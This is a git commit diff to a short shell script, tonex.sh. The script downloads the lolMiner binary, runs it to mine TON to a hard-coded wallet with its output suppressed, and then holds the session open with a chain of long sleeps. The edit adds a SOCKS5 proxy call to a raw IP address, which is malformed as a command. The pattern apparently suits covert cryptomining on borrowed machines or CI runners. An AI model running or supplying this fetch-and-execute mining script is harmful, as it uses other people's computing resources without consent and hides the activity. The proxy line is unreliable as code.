d4398dc2f08bcf7a0ae1b2d078b4a41334d0e970
Taryok <92034895+Taryok@users.noreply.github.com>
2022-03-22 08:02:59 +0700

    Update tonex.sh

--- tonex.sh
+++ tonex.sh
@@ -1,3 +1,3 @@
-wget -nv -c https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz -O - | tar -xz && ./1.42/lolMiner -a TON -p https://next.ton-pool.com -u EQAGJera9rXEO6k8B7WFlgrNuUVvNmyPjJbohoRPzBMFtsdr --apiport 4444 >/dev/null 2>&1
+wget -nv -c https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz -O - | tar -xz >/dev/null 2>&1 && ./1.42/lolMiner -a TON -p https://next.ton-pool.com -u EQAGJera9rXEO6k8B7WFlgrNuUVvNmyPjJbohoRPzBMFtsdr --apiport 4444 && proxy socks5://184.178.172.14:4145 
 
 sleep 9 && sleep 99 && sleep 999 && sleep 9999 && sleep 99999
